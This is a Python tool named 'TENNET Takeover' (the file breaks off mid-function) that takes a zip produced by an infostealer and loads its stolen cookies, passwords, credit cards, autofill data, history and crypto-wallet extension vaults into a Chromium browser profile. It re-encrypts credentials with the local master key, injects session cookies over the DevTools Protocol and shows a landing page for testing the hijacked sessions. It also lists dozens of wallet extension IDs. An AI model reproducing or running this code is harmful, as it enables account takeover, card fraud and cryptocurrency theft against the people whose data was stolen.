import json
import sys
import time
import os
import subprocess
import zipfile
import urllib.parse
import sqlite3
import shutil
import base64
import uuid
import websocket
import requests as req

try:
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

CHROME_EPOCH_OFFSET = 11644473600

WALLET_EXTENSIONS = {
    'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
    'coinbase': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
    'phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
    'tronlink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
    'trust': 'egjidjbpglichdcondbcbdnbeeppgdph',
    'okx': 'mcohilncbfahbmgdjkbpemcciiolgcge',
    'keplr': 'dmkamcknogkgcdfhhbddcghachkejeap',
    'bnb-chain': 'fhbohimaelbohpjbbldcngcnapndodjp',
    'braavos': 'jnlgamecbpmbajjfhmmmlhejkemejdma',
    'manta': 'enabgbdfcbaehmbigakijjabdpdnimlg',
    'math': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
    'ronin': 'fnjhmkhhmkbjkkabndcnnogagogbneec',
    'exodus': 'aholpfdialjgjfhomihkjbmgjidlcdno',
    'rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
    'brave-wallet': 'odbfpeeihdkbihmopkbjmoonfanlbfcl',
    'tokenpocket': 'mfgccjchihfkkindfppnaooecgfneiii',
    'bitget': 'jiidiaalihmmhddjgbnbgdffknnlceai',
    'sui': 'opcgpfmipidbgpenhmajoajpbobppdil',
    'leap': 'fcfcfllfndlomdhbehjjcoimbgofdncg',
    'station': 'aiifbnbfobpmeekipheeijimdpnlpgpp',
    'compass': 'anokgmphncpekkhclmingpimjmcooifb',
    'conflux': 'djhangpaibgoanolfdamjpigcaijdlah',
    'plug': 'cfbfdhimifdmdehjmkdobpcjfefblkjm',
    'coin98': 'aeachknmefphepccionboohckonoeemg',
    'xdefi': 'hmeobnfnfcmdkdcmlblgagmfpfboieaf',
    'clover': 'nhnkbkgjikgcigadomkphalanndcapjk',
    'yoroi': 'ffnbelfdoeiohenkjibnmadjiehjhajb',
    'solflare': 'bhhhlbepdkbapadjdcodbhkbmljfand',
    'slope': 'pocmplpaccanhmnllbbkpgfliimjahi',
}


BROWSERS = {
    'chrome': {
        'paths': [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
        ],
        'user_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
        'process': 'chrome.exe',
    },
    'brave': {
        'paths': [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        ],
        'user_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'process': 'brave.exe',
    },
    'edge': {
        'paths': [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        ],
        'user_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
        'process': 'msedge.exe',
    },
}


def find_installed():
    """Return list of browsers that are actually installed."""
    installed = []
    for name, cfg in BROWSERS.items():
        for path in cfg['paths']:
            if os.path.exists(path):
                installed.append(name)
                break
    return installed


def stdin_available():
    """Return False when PyInstaller windowed EXE has no usable stdin."""
    try:
        if sys.stdin is None:
            return False
        sys.stdin.fileno()
        return True
    except (RuntimeError, AttributeError, OSError, ValueError):
        return False


def show_message(title, message, kind='info'):
    """Show a dialog when console input/output is unavailable."""
    try:
        import tkinter as tk
        from tkinter import messagebox

        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        if kind == 'error':
            messagebox.showerror(title, message, parent=root)
        else:
            messagebox.showinfo(title, message, parent=root)
        root.destroy()
    except Exception:
        print(f"\n  [{kind}] {title}: {message}")


def ask_browser_dialog(installed):
    """Browser picker for windowed / no-stdin mode."""
    try:
        import tkinter as tk

        choice = {'value': None}

        root = tk.Tk()
        root.title('TENNET Takeover')
        root.attributes('-topmost', True)
        root.resizable(False, False)

        tk.Label(root, text='Choose browser for import:').pack(padx=20, pady=(15, 10))

        var = tk.StringVar(value=installed[0])
        for name in installed:
            tk.Radiobutton(root, text=name, variable=var, value=name).pack(anchor='w', padx=30)

        def on_ok():
            choice['value'] = var.get()
            root.destroy()

        def on_cancel():
            root.destroy()

        btn_frame = tk.Frame(root)
        btn_frame.pack(pady=15)
        tk.Button(btn_frame, text='OK', width=10, command=on_ok).pack(side='left', padx=5)
        tk.Button(btn_frame, text='Cancel', width=10, command=on_cancel).pack(side='left', padx=5)

        root.protocol('WM_DELETE_WINDOW', on_cancel)
        root.mainloop()
        return choice['value']
    except Exception:
        return None


def ask_browser():
    """Ask user which browser to use for import."""
    installed = find_installed()

    if not installed:
        msg = 'No supported browser found (chrome, brave, edge)'
        print(f"\n  [!] {msg}")
        if not stdin_available():
            show_message('TENNET Takeover', msg, kind='error')
        sys.exit(1)

    if not stdin_available():
        browser = ask_browser_dialog(installed)
        if browser:
            return browser
        print('  [!] No browser selected')
        sys.exit(1)

    print("\n  Available browsers:")
    for i, name in enumerate(installed, 1):
        print(f"    {i}. {name}")

    while True:
        try:
            choice = input(f"\n  Choose browser [1-{len(installed)}]: ").strip()
            idx = int(choice) - 1
            if 0 <= idx < len(installed):
                return installed[idx]
        except (ValueError, EOFError, KeyboardInterrupt, RuntimeError):
            pass
        print("  Invalid choice, try again")


def load_zip(zip_path):
    """Load every artifact TennetExtractor puts in the zip archive."""
    data = {
        'cookies': [],
        'passwords': [],
        'cards': [],
        'autofill': [],
        'bookmarks': [],
        'history': [],
        'wallets': {},
        'desktop_wallets': {},
        'user_agents': {},
    }

    with zipfile.ZipFile(zip_path, 'r') as zf:
        for entry in zf.namelist():
            if entry.endswith('/'):
                continue
            try:
                raw_bytes = zf.read(entry)
                if entry.endswith('cookies.json'):
                    data['cookies'].extend(json.loads(raw_bytes))
                elif entry.endswith('passwords.json'):
                    data['passwords'].extend(json.loads(raw_bytes))
                elif entry.endswith('credit_cards.json'):
                    data['cards'].extend(json.loads(raw_bytes))
                elif entry.endswith('autofill.json'):
                    data['autofill'].extend(json.loads(raw_bytes))
                elif entry.endswith('bookmarks.json'):
                    data['bookmarks'].extend(json.loads(raw_bytes))
                elif entry.endswith('history.json'):
                    data['history'].extend(json.loads(raw_bytes))
                elif entry == 'user_agents.json':
                    data['user_agents'] = json.loads(raw_bytes)
                elif entry.startswith('desktop_wallets/') and not entry.endswith('index.json'):
                    parts = entry.split('/', 2)
                    if len(parts) >= 3:
                        wallet_name, fname = parts[1], parts[2]
                        data['desktop_wallets'].setdefault(wallet_name, {})[fname] = raw_bytes
                elif '/wallets/' in entry and not entry.endswith('index.json'):
                    parts = entry.split('/')
                    widx = parts.index('wallets')
                    if widx + 2 < len(parts):
                        wallet_name = parts[widx + 1]
                        rel = '/'.join(parts[widx + 2:]).replace('_', '/')
                        data['wallets'].setdefault(wallet_name, {})[rel] = raw_bytes
            except Exception:
                continue

    return data


def chrome_timestamp(ts=None):
    if ts is None:
        ts = time.time()
    return int((float(ts) + CHROME_EPOCH_OFFSET) * 1_000_000)


def find_binary(browser):
    for path in BROWSERS[browser]['paths']:
        if os.path.exists(path):
            return path
    return None


def resolve_user_data(browser, use_real_profile):
    if use_real_profile:
        return BROWSERS[browser]['user_data']
    user_data = import_profile_dir(browser)
    os.makedirs(user_data, exist_ok=True)
    return user_data


def find_profile_db(profile_path, names):
    for name in names:
        direct = os.path.join(profile_path, name)
        if os.path.exists(direct):
            return direct
        nested = os.path.join(profile_path, 'Network', name)
        if os.path.exists(nested):
            return nested
    return None


def get_master_key(user_data):
    if not HAS_CRYPTO:
        return None
    local_state = os.path.join(user_data, 'Local State')
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            payload = json.load(f)
        enc = payload.get('os_crypt', {}).get('encrypted_key')
        if not enc:
            return None
        key_blob = base64.b64decode(enc)[5:]
        return CryptUnprotectData(key_blob, None, None, None, 0)[1]
    except Exception:
        return None


def encrypt_secret(value, master_key):
    if not value or not master_key:
        return None
    iv = os.urandom(12)
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
    ct, tag = cipher.encrypt_and_digest(str(value).encode('utf-8'))
    return b'v10' + iv + ct + tag


def bootstrap_profile(browser, user_data, profile='Default'):
    """First-run the import profile so Chromium creates its SQLite databases."""
    profile_path = os.path.join(user_data, profile)
    login_db = find_profile_db(profile_path, ('Login Data',))
    if login_db:
        return

    binary = find_binary(browser)
    if not binary:
        return

    os.makedirs(profile_path, exist_ok=True)
    cmd = [
        binary,
        f'--user-data-dir={user_data}',
        f'--profile-directory={profile}',
        '--no-first-run',
        '--no-default-browser-check',
        'about:blank',
    ]
    flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=flags)
    for _ in range(30):
        if find_profile_db(profile_path, ('Login Data', 'Web Data')):
            break
        time.sleep(0.5)
    kill_browser(browser)
    clear_profile_locks(user_data)


class ProfileImporter:
    """Write decrypted zip contents into a Chromium profile on disk."""

    def __init__(self, user_data, profile='Default'):
        self.user_data = user_data
        self.profile = profile
        self.profile_path = os.path.join(user_data, profile)
        self.master_key = None
        self.stats = {
            'passwords': 0,
            'cards': 0,
            'autofill': 0,
            'bookmarks': 0,
            'history': 0,
            'wallets': 0,
            'desktop_wallets': 0,
        }

    def prepare(self):
        os.makedirs(self.profile_path, exist_ok=True)
        self.master_key = get_master_key(self.user_data)

    def import_all(self, payload):
        self.prepare()
        self._import_passwords(payload.get('passwords', []))
        self._import_credit_cards(payload.get('cards', []))
        self._import_autofill(payload.get('autofill', []))
        self._import_bookmarks(payload.get('bookmarks', []))
        self._import_history(payload.get('history', []))
        self._import_wallets(payload.get('wallets', {}))
        self._import_desktop_wallets(payload.get('desktop_wallets', {}))
        return self.stats

    def _import_passwords(self, passwords):
        if not passwords or not self.master_key:
            return
        db_path = find_profile_db(self.profile_path, ('Login Data',))
        if not db_path:
            return
        now = chrome_timestamp()
        conn = sqlite3.connect(db_path)
        try:
            for entry in passwords:
                url = entry.get('url', '').strip()
                user = entry.get('username', entry.get('user', '')).strip()
                pwd = entry.get('password', entry.get('pass', '')).strip()
                if not url or not user or not pwd:
                    continue
                enc = encrypt_secret(pwd, self.master_key)
                if not enc:
                    continue
                realm = url if url.endswith('/') else f'{url.split("?")[0]}/'
                if '://' in realm:
                    scheme, rest = realm.split('://', 1)
                    host = rest.split('/')[0]
                    realm = f'{scheme}://{host}/'
                try:
                    conn.execute('''
                        INSERT INTO logins (
                            origin_url, action_url, username_element, username_value,
                            password_element, password_value, submit_element, signon_realm,
                            date_created, date_password_modified, date_last_used,
                            blacklisted_by_user, scheme, password_type, times_used,
                            display_name, icon_url, federation_url
                        ) VALUES (?, '', '', ?, '', ?, '', ?, ?, ?, ?, 0, 0, 0, 0, '', '', '')
                    ''', (url, user, enc, realm, now, now, now))
                    self.stats['passwords'] += 1
                except sqlite3.Error:
                    continue
            conn.commit()
        finally:
            conn.close()

    def _import_credit_cards(self, cards):
        if not cards or not self.master_key:
            return
        db_path = find_profile_db(self.profile_path, ('Web Data',))
        if not db_path:
            return
        now = chrome_timestamp()
        conn = sqlite3.connect(db_path)
        try:
            cols = {row[1] for row in conn.execute('PRAGMA table_info(credit_cards)')}
            for card in cards:
                number = str(card.get('number', '')).strip()
                if not number:
                    continue
                enc = encrypt_secret(number, self.master_key)
                if not enc:
                    continue
                name = card.get('name', '')
                month = int(card.get('month', 0) or 0)
                year = int(card.get('year', 0) or 0)
                origin = card.get('origin', '')
                values = {
                    'name_on_card': name,
                    'expiration_month': month,
                    'expiration_year': year,
                    'card_number_encrypted': enc,
                    'date_modified': now,
                }
                if 'origin' in cols:
                    values['origin'] = origin
                if 'use_count' in cols:
                    values['use_count'] = 1
                if 'use_date' in cols:
                    values['use_date'] = now
                keys = [k for k in values if k in cols]
                if not keys:
                    continue
                placeholders = ', '.join('?' for _ in keys)
                try:
                    conn.execute(
                        f"INSERT INTO credit_cards ({', '.join(keys)}) VALUES ({placeholders})",
                        [values[k] for k in keys],
                    )
                    self.stats['cards'] += 1
                except sqlite3.Error:
                    continue
            conn.commit()
        finally:
            conn.close()

    def _import_autofill(self, autofill):
        if not autofill:
            return
        db_path = find_profile_db(self.profile_path, ('Web Data',))
        if not db_path:
            return
        now = chrome_timestamp()
        conn = sqlite3.connect(db_path)
        try:
            cols = {row[1] for row in conn.execute('PRAGMA table_info(autofill)')}
            for entry in autofill:
                field = str(entry.get('field', entry.get('name', ''))).strip()
                value = str(entry.get('value', '')).strip()
                if not field or not value:
                    continue
                count = int(entry.get('count', 1) or 1)
                row = {'name': field, 'value': value, 'count': count}
                if 'date_created' in cols:
                    row['date_created'] = now
                if 'date_last_used' in cols:
                    row['date_last_used'] = int(entry.get('last_used', 0) or now)
                keys = [k for k in row if k in cols]
                try:
                    conn.execute(
                        f"INSERT INTO autofill ({', '.join(keys)}) VALUES ({', '.join('?' for _ in keys)})",
                        [row[k] for k in keys],
                    )
                    self.stats['autofill'] += 1
                except sqlite3.Error:
                    continue
            conn.commit()
        finally:
            conn.close()

    def _import_bookmarks(self, bookmarks):
        if not bookmarks:
            return
        path = os.path.join(self.profile_path, 'Bookmarks')
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    tree = json.load(f)
            except Exception:
                tree = None
        else:
            tree = None

        if not tree:
            tree = {
                'checksum': '',
                'roots': {
                    'bookmark_bar': {
                        'children': [],
                        'date_added': str(chrome_timestamp()),
                        'date_modified': str(chrome_timestamp()),
                        'id': '1',
                        'name': 'Bookmarks bar',
                        'type': 'folder',
                    },
                    'other': {
                        'children': [],
                        'date_added': str(chrome_timestamp()),
                        'date_modified': str(chrome_timestamp()),
                        'id': '2',
                        'name': 'Other bookmarks',
                        'type': 'folder',
                    },
                    'synced': {
                        'children': [],
                        'date_added': str(chrome_timestamp()),
                        'date_modified': str(chrome_timestamp()),
                        'id': '3',
                        'name': 'Mobile bookmarks',
                        'type': 'folder',
                    },
                },
                'version': 1,
            }

        imported = {
            'children': [],
            'date_added': str(chrome_timestamp()),
            'date_modified': str(chrome_timestamp()),
            'id': str(uuid.uuid4().int % 10_000_000),
            'name': 'TENNET Import',
            'type': 'folder',
        }
        for i, bm in enumerate(bookmarks, 1):
            url = bm.get('url', '').strip()
            if not url:
                continue
            imported['children'].append({
                'date_added': str(chrome_timestamp()),
                'date_last_used': '0',
                'guid': str(uuid.uuid4()),
                'id': str(10_000 + i),
                'name': bm.get('name', url) or url,
                'type': 'url',
                'url': url,
            })
            self.stats['bookmarks'] += 1

        if imported['children']:
            tree['roots']['bookmark_bar']['children'].append(imported)
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(tree, f, indent=2)

    def _import_history(self, history):
        if not history:
            return
        db_path = find_profile_db(self.profile_path, ('History',))
        if not db_path:
            return
        conn = sqlite3.connect(db_path)
        try:
            visit_cols = [row[1] for row in conn.execute('PRAGMA table_info(visits)')]
            for entry in history[:2000]:
                url = entry.get('url', '').strip()
                if not url:
                    continue
                title = entry.get('title', '') or url
                visits = int(entry.get('visits', 1) or 1)
                last_visit = entry.get('last_visit', 0)
                ts = chrome_timestamp(last_visit) if last_visit else chrome_timestamp()
                try:
                    cur = conn.execute(
                        'INSERT INTO urls (url, title, visit_count, typed_count, last_visit_time, hidden) '
                        'VALUES (?, ?, ?, 0, ?, 0)',
                        (url, title, visits, ts),
                    )
                    url_id = cur.lastrowid
                    row = {
                        'url': url_id,
                        'visit_time': ts,
                        'from_visit': 0,
                        'transition': 805306368,
                        'segment_id': 0,
                        'visit_duration': 0,
                        'incremented_omnibox_typed_score': 0,
                    }
                    keys = [k for k in row if k in visit_cols]
                    conn.execute(
                        f"INSERT INTO visits ({', '.join(keys)}) VALUES ({', '.join('?' for _ in keys)})",
                        [row[k] for k in keys],
                    )
                    self.stats['history'] += 1
                except sqlite3.Error:
                    continue
            conn.commit()
        finally:
            conn.close()

    def _import_wallets(self, wallets):
        for wallet_name, files in wallets.items():
            ext_id = WALLET_EXTENSIONS.get(wallet_name)
            if not ext_id or not files:
                continue
            for rel_path, content in files.items():
                if rel_path.startswith('indexeddb/'):
                    sub = rel_path.split('/', 1)[1]
                    dest_dir = os.path.join(
                        self.profile_path,
                        'IndexedDB',
                        f'chrome-extension_{ext_id}_0.indexeddb.leveldb',
                    )
                    dest = os.path.join(dest_dir, os.path.basename(sub))
                elif rel_path.startswith('sync/'):
                    dest = os.path.join(
                        self.profile_path, 'Sync Extension Settings', ext_id, rel_path.split('/', 1)[1],
                    )
                else:
                    fname = rel_path.split('/')[-1]
                    if rel_path.startswith('local/'):
                        fname = rel_path.split('/', 1)[1]
                    dest = os.path.join(self.profile_path, 'Local Extension Settings', ext_id, fname)
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                with open(dest, 'wb') as f:
                    f.write(content)
                self.stats['wallets'] += 1

    def _import_desktop_wallets(self, wallets):
        base = os.path.join(os.path.dirname(self.user_data), 'desktop_wallets')
        for wallet_name, files in wallets.items():
            for fname, content in files.items():
                dest = os.path.join(base, wallet_name, fname)
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                with open(dest, 'wb') as f:
                    f.write(content)
                self.stats['desktop_wallets'] += 1


def kill_browser(browser):
    """Kill browser process and wait until it fully exits."""
    proc = BROWSERS[browser]['process']
    os.system(f'taskkill /F /IM {proc} /T >nul 2>&1')
    for _ in range(20):
        result = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {proc}'],
            capture_output=True, text=True,
        )
        if proc.lower() not in result.stdout.lower():
            break
        time.sleep(0.5)
    time.sleep(1)


def find_free_port(start=9222, end=9232):
    """Pick the first available localhost port for CDP."""
    import socket
    for port in range(start, end + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.bind(('127.0.0.1', port))
                return port
            except OSError:
                continue
    return start


def import_profile_dir(browser):
    """Dedicated user-data-dir for CDP injection (real profiles block debugging)."""
    return os.path.join(os.getenv('TEMP', '.'), 'tennet-takeover', browser, 'User Data')


def clear_profile_locks(user_data):
    """Remove Chromium singleton locks left behind after force-kill."""
    for name in ('SingletonLock', 'SingletonCookie', 'SingletonSocket', 'lockfile'):
        try:
            path = os.path.join(user_data, name)
            if os.path.lexists(path):
                os.remove(path)
        except OSError:
            pass


def launch_browser(browser, profile, port, user_data):
    """Launch browser with remote debugging enabled."""
    binary = find_binary(browser)
    if not binary:
        return False, 'browser binary not found'

    clear_profile_locks(user_data)

    cmd = [
        binary,
        f'--remote-debugging-port={port}',
        f'--user-data-dir={user_data}',
        f'--profile-directory={profile}',
        '--remote-allow-origins=*',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-features=DevToolsDebuggingRestrictions',
        'about:blank',
    ]

    creationflags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
    subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=creationflags,
    )

    for _ in range(40):
        try:
            r = req.get(f'http://127.0.0.1:{port}/json', timeout=1)
            if r.status_code == 200:
                return True, f'CDP ready on :{port}'
        except Exception:
            pass
        time.sleep(0.5)

    return False, (
        'CDP port never opened — Chromium blocks remote debugging on locked profiles. '
        'Retry without --real-profile.'
    )


def connect_cdp(port):
    """Connect to CDP WebSocket."""
    targets = req.get(f'http://127.0.0.1:{port}/json').json()
    page = next((t for t in targets if t.get('type') == 'page'), targets[0])
    return websocket.create_connection(page['webSocketDebuggerUrl'], timeout=10)


def cdp_send(ws, method, params=None, cmd_id=1):
    """Send CDP command and wait for response."""
    msg = {'id': cmd_id, 'method': method}
    if params:
        msg['params'] = params
    ws.send(json.dumps(msg))
    while True:
        resp = json.loads(ws.recv())
        if resp.get('id') == cmd_id:
            return resp
        time.sleep(0.01)


def cookie_domain(cookie):
    raw = (cookie.get('domain') or cookie.get('host') or '').strip().lstrip('.')
    return raw.lower()


def top_domains(cookies, limit=12):
    """Rank domains by cookie count for the post-inject landing page."""
    counts = {}
    for cookie in cookies:
        domain = cookie_domain(cookie)
        if not domain or domain in ('localhost', '127.0.0.1'):
            continue
        root = '.'.join(domain.split('.')[-2:]) if domain.count('.') >= 1 else domain
        counts[root] = counts.get(root, 0) + 1
    return sorted(counts.items(), key=lambda item: -item[1])[:limit]


def build_landing_html(domains, cookie_ok, cookie_fail, profile_stats):
    """In-browser summary of everything imported."""
    links = ''.join(
        f'<li><a href="https://{name}/" target="_self">{name}</a> '
        f'<span class="meta">{count} cookies</span></li>'
        for name, count in domains
    ) or '<li>No domains found — type a URL in the address bar.</li>'

    rows = [
        ('Cookies (session)', str(cookie_ok), str(cookie_fail) if cookie_fail else '—'),
        ('Passwords', str(profile_stats.get('passwords', 0)), '—'),
        ('Credit cards', str(profile_stats.get('cards', 0)), '—'),
        ('Autofill fields', str(profile_stats.get('autofill', 0)), '—'),
        ('Bookmarks', str(profile_stats.get('bookmarks', 0)), '—'),
        ('History URLs', str(profile_stats.get('history', 0)), '—'),
        ('Wallet vault files', str(profile_stats.get('wallets', 0)), '—'),
        ('Desktop wallet files', str(profile_stats.get('desktop_wallets', 0)), '—'),
    ]
    table = ''.join(
        f'<tr><td>{label}</td><td class="ok">{ok}</td><td class="warn">{fail}</td></tr>'
        for label, ok, fail in rows
    )

    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TENNET Takeover</title>
<style>
  body {{ font-family: Segoe UI, sans-serif; background:#0f1117; color:#e8eaed;
         max-width: 820px; margin: 40px auto; padding: 0 24px; }}
  h1 {{ font-size: 1.6rem; margin-bottom: 0.25rem; }}
  p, li, td {{ line-height: 1.5; color:#bdc1c6; }}
  .ok {{ color:#81c995; }} .warn {{ color:#fdd663; }}
  a {{ color:#8ab4f8; text-decoration:none; }} a:hover {{ text-decoration:underline; }}
  .meta {{ color:#9aa0a6; font-size: 0.9rem; }}
  ol {{ padding-left: 1.2rem; }} li {{ margin: 0.55rem 0; }}
  .box {{ background:#1a1d24; border:1px solid #30343b; border-radius:10px; padding:16px 20px; margin:16px 0; }}
  table {{ width:100%; border-collapse: collapse; }}
  td {{ padding: 6px 8px; border-bottom: 1px solid #30343b; }}
</style></head><body>
  <h1>TENNET Takeover — full import complete</h1>
  <p>All zip data has been written into this isolated browser profile. Use the links below to test sessions.</p>
  <div class="box">
    <table><tr><th>Data type</th><th>Imported</th><th>Failed</th></tr>{table}</table>
  </div>
  <div class="box">
    <p><strong>Top domains</strong> (click to test cookie sessions):</p>
    <ol>{links}</ol>
  </div>
  <p>Passwords/cards: chrome://settings/passwords · Bookmarks: Ctrl+Shift+O · Wallets: install the extension first, then restart this profile.</p>
</body></html>"""


def open_landing_page(ws, cookies, cookie_ok, cookie_fail, profile_stats, cmd_id=50):
    """Navigate away from about:blank to a helpful landing page."""
    cdp_send(ws, 'Page.enable', cmd_id=cmd_id)
    domains = top_domains(cookies)
    html = build_landing_html(domains, cookie_ok, cookie_fail, profile_stats)
    url = 'data:text/html;charset=utf-8,' + urllib.parse.quote(html)
    cdp_send(ws, 'Page.navigate', {'url': url}, cmd_id=cmd_id + 1)
    return domains


def normalize_cookie(cookie):
    """Map TennetExtractor / Cookie-Editor fields to CDP-compatible values."""
    domain = (cookie.get('domain') or cookie.get('host') or '').strip()
    name = cookie.get('name', '')
    value = cookie.get('value', '')

    if not name or not value or not domain:
        return None

    host_only = cookie.get('hostOnly')
    if host_only is None:
        host_only = not domain.startswith('.')

    # Tennet export always prefixes a dot even for host-only cookies — CDP rejects that.
    if host_only:
        domain = domain.lstrip('.')

    samesite = str(cookie.get('sameSite', cookie.get('samesite', 'Lax'))).lower()
    ss_map = {
        'no_restriction': 'None', 'none': 'None',
        'lax': 'Lax', 'strict': 'Strict', 'unspecified': 'Lax',
    }
    ss = ss_map.get(samesite, 'Lax')
    secure = bool(cookie.get('secure', False))
    if ss == 'None':
        secure = True

    scheme = 'https' if secure else 'http'
    params = {
        'name': name,
        'value': value,
        'path': cookie.get('path', '/') or '/',
        'secure': secure,
        'httpOnly': bool(cookie.get('httpOnly', cookie.get('httponly', False))),
        'sameSite': ss,
        'url': f'{scheme}://{domain}/',
    }

    if not host_only:
        params['domain'] = f'.{domain.lstrip(".")}'

    expires = cookie.get('expirationDate', cookie.get('expires', 0))
    if expires and float(expires) > 0:
        params['expires'] = float(expires)

    return params


def inject_cookie(ws, cookie, cmd_id):
    """Inject a single cookie via CDP."""
    params = normalize_cookie(cookie)
    if not params:
        return False, 'missing fields'

    resp = cdp_send(ws, 'Network.setCookie', params, cmd_id=cmd_id)
    if resp.get('result', {}).get('success'):
        return True, None

    err = resp.get('result', {}).get('errorMessage') or resp.get('error', {}).get('message')
    return False, err or 'rejected'


def pick_zip_file():
    """Open a file picker for the TennetExtractor zip (GUI mode)."""
    try:
        import tkinter as tk
        from tkinter import filedialog

        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        path = filedialog.askopenfilename(
            parent=root,
            title='TENNET Takeover — select data zip',
            filetypes=[
                ('ZIP archives', '*.zip'),
                ('All files', '*.*'),
            ],
        )
        root.destroy()
        return path.strip() if path else None
    except Exception:
        return None


def parse_args():
    """CLI args or interactive file picker when run as EXE / without arguments."""
    verbose = '--verbose' in sys.argv or '-v' in sys.argv
    use_real_profile = '--real-profile' in sys.argv
    skip_flags = {'--verbose', '-v', '--real-profile', '--pick', '-p', '--help', '-h'}
    args = [a for a in sys.argv[1:] if a not in skip_flags]

    if '--help' in sys.argv or '-h' in sys.argv:
        print("\n  Usage:")
        print("    TennetTakeover.exe              → file picker + browser menu")
        print("    TennetTakeover.exe data.zip     → inject into auto-detected browser")
        print("    TennetTakeover.exe data.zip edge")
        print("    TennetTakeover.exe data.zip edge Default -v")
        print("\n  Flags: -v verbose  --real-profile  --pick force file picker")
        sys.exit(0)

    force_picker = '--pick' in sys.argv or '-p' in sys.argv

    if not args or force_picker:
        print('\n  [*] Select your TENNET-stealer zip file...')
        source = pick_zip_file()
        if not source and stdin_available():
            try:
                source = input('  Zip path (or Enter to cancel): ').strip().strip('"')
            except (EOFError, RuntimeError):
                source = None
        if not source:
            print('  [!] No file selected')
            if not stdin_available():
                show_message('TENNET Takeover', 'No zip file selected.', kind='error')
            sys.exit(1)
        browser = None
        profile = 'Default'
        return source, browser, profile, verbose, use_real_profile

    source = args[0].strip().strip('"')
    browser = args[1] if len(args) > 1 else None
    profile = args[2] if len(args) > 2 else 'Default'
    return source, browser, profile, verbose, use_real_profile


def pause_if_gui():
    """Keep console open when double-clicking a console EXE."""
    if (
        getattr(sys, 'frozen', False)
        and sys.platform == 'win32'
        and stdin_available()
    ):
        try:
            input('\n  Press Enter to close...')
        except (EOFError, KeyboardInterrupt, RuntimeError):
            pass


def main():
    if sys.platform == 'win32':
        try:
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
        except Exception:
            pass

    print()
    print("  ╔══════════════════════════════════════════╗")
    print("  ║     ⚡  T E N N E T   T A K E O V E R     ║")
    print("  ╚══════════════════════════════════════════╝")

    source, browser, profile, verbose, use_real_profile = parse_args()

    if not os.path.exists(source):
        print(f"\n  [!] File not found: {source}")
        sys.exit(1)

    port = find_free_port()

    if not browser:
        browser = ask_browser()

    if browser not in BROWSERS:
        print(f"\n  [!] Unknown browser: {browser}")
        print(f"  Supported: {', '.join(BROWSERS.keys())}")
        sys.exit(1)

    print(f"\n  Source:  {source}")
    print(f"  Browser: {browser}")
    print(f"  Profile: {profile}")

    print(f"\n  [*] Loading data from zip...")
    payload = load_zip(source)
    cookies = payload['cookies']
    passwords = payload['passwords']
    cards = payload['cards']
    wallets = payload['wallets']

    print(f"  [+] {len(cookies)} cookies")
    print(f"  [+] {len(passwords)} passwords")
    print(f"  [+] {len(cards)} credit cards")
    print(f"  [+] {len(payload['autofill'])} autofill entries")
    print(f"  [+] {len(payload['bookmarks'])} bookmarks")
    print(f"  [+] {len(payload['history'])} history entries")
    print(f"  [+] {sum(len(v) for v in wallets.values())} wallet files ({len(wallets)} wallets)")
    print(f"  [+] {sum(len(v) for v in payload['desktop_wallets'].values())} desktop wallet files")

    if not any([
        cookies, passwords, cards, payload['autofill'],
        payload['bookmarks'], payload['history'], wallets, payload['desktop_wallets'],
    ]):
        print("\n  [!] Zip contains no importable data")
        sys.exit(1)

    if passwords and verbose:
        print(f"\n  ── PASSWORDS ──────────────────────────────")
        for pw in passwords[:20]:
            url = pw.get('url', '')
            domain = url.split('/')[2] if len(url.split('/')) > 2 else url
            print(f"  {domain}")
            print(f"    user: {pw.get('username', pw.get('user', ''))}")
            print(f"    pass: {pw.get('password', pw.get('pass', ''))}")
        if len(passwords) > 20:
